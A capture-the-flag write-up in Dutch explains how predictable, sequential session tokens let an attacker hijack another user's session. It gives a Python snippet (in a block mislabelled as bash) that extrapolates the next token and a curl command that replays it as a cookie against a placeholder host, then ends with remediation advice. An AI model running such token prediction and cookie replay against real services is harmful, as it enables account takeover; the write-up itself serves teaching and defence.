# CTF Writeup: Broken Authentication — Weak Session Tokens

**Category:** Web / Auth  
**Difficulty:** Medium  
**Challenge:** Broken Authentication — Weak Session Tokens  
**Date Solved:** 2026-05-24

---

## 📝 Wat was het?

Session tokens zijn voorspelbaar wanneer ze gebaseerd zijn op sequentiële nummers, timestamps, of tijd-gebaseerde patronen. Door het volgende geldige token te voorspellen, kun je een andere gebruiker hun sessie "kapen" (session hijacking).

---

## 🔍 Stappen

### Stap 1: Verzamel tokens
Log twee keer in op de applicatie en verzamel de session tokens:
- Session 1: `abc123`
- Session 2: `abc456`

### Stap 2: Analyseer het patroon
- Beide tokens beginnen met `abc`
- Het numerieke deel neemt toe: `123` → `456`
- Het verschil is `333` (waarschijnlijk een vaste increment)
- Volgende voorspelde token: `abc789`

### Stap 3: Voorspel het volgende token
```bash
# Python om volgende token te berekenen
s1 = "abc123"
s2 = "abc456"
prefix = s1[:3]  # "abc"
num1 = int(s1[3:])
num2 = int(s2[3:])
step = num2 - num1  # 333
next_token = prefix + str(num2 + step)  # "abc789"
```

### Stap 4: Sessie kapen
```bash
curl -H "Cookie: session=abc789" https://target.com/api/profile
```

### Stap 5: Resultaat
Je bent ingelogd als de volgende gebruiker — volledige toegang tot hun account.

---

## 💡 Leerpunt

> **Voorspelbare sessietokens zijn gevaarlijk.** Gebruik cryptografisch veilige random tokens (minimaal 128 bits entropy). Controleer altijd of een token daadwerkelijk door de server is uitgegeven. Implementeer sessie-rotatie na login en timeouts. Gebruik `secrets.token_hex(32)` in Python of vergelijkbare cryptografische RNG's.

---

## 🛠️ Tools gebruikt

- Python (pattern analysis)
- curl (token injection)
- Burp Suite (intercept & analyze tokens)

## 🔗 Gerelateerde concepten

- Session fixation
- JWT algorithm confusion (`alg: none`)
- Cookie attributes (`HttpOnly`, `Secure`, `SameSite`)
- OAuth token hijacking